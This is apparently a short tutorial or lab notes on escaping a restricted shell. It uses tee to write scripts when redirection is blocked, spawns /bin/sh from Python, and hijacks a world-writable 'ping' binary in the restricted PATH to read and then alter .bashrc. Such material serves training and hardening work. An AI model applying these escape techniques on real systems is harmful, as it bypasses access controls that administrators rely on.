# Interactive Shell From Scratch

## `tee`

If you do not have access to an editor, and would like to create a script, you can make use of the `tee` command. Since you cannot make use of `>` or `>>`, the `tee` command can help you direct your output when used in tandem with the `echo` command. This is not a shell escape in of itself, but consider the following:

```
$ echo "evil script code" | tee script.sh
```

You will be able to create a file called script.sh in your home directory and add your script code to the file. Once the file is created, use the `tee -a` option for all subsequent commands as the `-a` allows you to append to the file rather than overwrite the file.

```python
exit_code = os.system('/bin/sh') 
output = os.popen('/bin/sh').read()
```

```bash
$ cat /tmp/id.sh
#!/bin/sh
/usr/bin/id
```

In this example, ping is a world writable executable located within the `$PATH`. When a terminal opens up, it reads `.bashrc` which tells it what behavior to default to. I used my ping script to cat my `.bashrc`.

```
echo '#!/bin/bash' | tee '/home/confined1/bin/ping'
echo '/bin/cat /home/confined1/.bashrc' | tee -a '/home/confined1/bin/ping'

confined1@someserver:~$ ping
PATH=/home/confined1/bin
export PATH
confined1@someserver:~$
```

So if we change our `.bashrc` file so that instead of setting our `PATH`, it sets our `SHELL` then we should be free! There we go, so now we log out, and back in again. When we log back in, our system will read our new `.bashrc` file and we'll be home free!